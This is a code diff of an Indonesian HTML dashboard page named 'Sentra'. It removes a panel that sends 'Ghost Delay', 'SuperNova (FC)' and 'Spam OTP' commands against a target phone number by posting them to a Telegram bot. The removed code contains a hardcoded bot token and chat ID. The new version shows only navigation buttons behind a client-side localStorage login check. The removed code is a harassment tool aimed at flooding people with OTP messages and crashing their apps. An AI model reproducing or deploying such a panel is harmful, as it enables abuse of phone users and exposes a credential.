@@ -1,56 +1,39 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Dashboard - Sentra</title>
-  <link rel="stylesheet" href="style.css" />
+  <meta charset="UTF-8">
+  <title>welcome to Sentra</title>
+  <link rel="stylesheet" href="style.css">
 </head>
-<body>
-  <div class="login-container">
-    <h2 id="welcome">Selamat Datang!</h2>
-    <input type="text" id="target" placeholder="Masukkan target (cth: 628xxxx)" />
-    <button onclick="sendCommand('/ghostdelay')">Ghost Delay</button>
-    <button onclick="sendCommand('/SuperNova')">SuperNova (FC)</button>
-    <button onclick="sendCommand('/spamotp')">Spam OTP</button>
-    <button onclick="logout()" style="background:#ff4d4d;color:white">Logout</button>
+<body onload="cekLogin()">
+  <div class="navbar">
+    <span class="left">🛟 Bantuan</span>
+    <span class="right" onclick="toggleMenu()">☰</span>
+  </div>
+  <div class="menu" id="menu">
+    <a href="#">Settings</a>
+    <a href="#" onclick="logout()">🚪 Keluar</a>
+  </div>
+
+  <div class="dashboard">
+    <button onclick="location.href='panel.html'">📦 Panel</button>
+    <button onclick="location.href='informasi.html'">ℹ️ Seputar Informasi</button>
   </div>
 
   <script>
-    const botToken = "7867246789:AAHkPwB0-khjfosZE9l3ORVcgfiYAVLn4DI"; // Bot A token
-    const chatId = "-1002745890175"; // Chat ID grup atau user
+    function cekLogin() {
+      if (localStorage.getItem("login") !== "true") {
+        window.location.href = "index.html";
+      }
+    }
+
+    function toggleMenu() {
+      document.getElementById("menu").classList.toggle("active");
+    }
 
     function logout() {
-      localStorage.removeItem("sentra_user");
-      window.location.href = "login.html"; // pastikan ini file login kamu
-    }
-
-    function sendCommand(command) {
-      const target = document.getElementById("target").value.trim();
-
-      if (!target.startsWith("62")) {
-        alert("Target harus dimulai dengan 62");
-        return;
-      }
-
-      const text = `${command} ${target}`;
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text })
-      }).then(() => {
-        alert("Terkirim!");
-        document.getElementById("target").value = "";
-      }).catch(err => {
-        alert("Gagal mengirim.");
-        console.error(err);
-      });
-    }
-
-    window.onload = () => {
-      const user = localStorage.getItem("sentra_user");
-      if (!user) return window.location.href = "index.html";
-      document.getElementById("welcome").innerText = `Selamat Datang, ${user}!`;
+      localStorage.removeItem("login");
+      window.location.href = "index.html";
     }
   </script>
 </body>
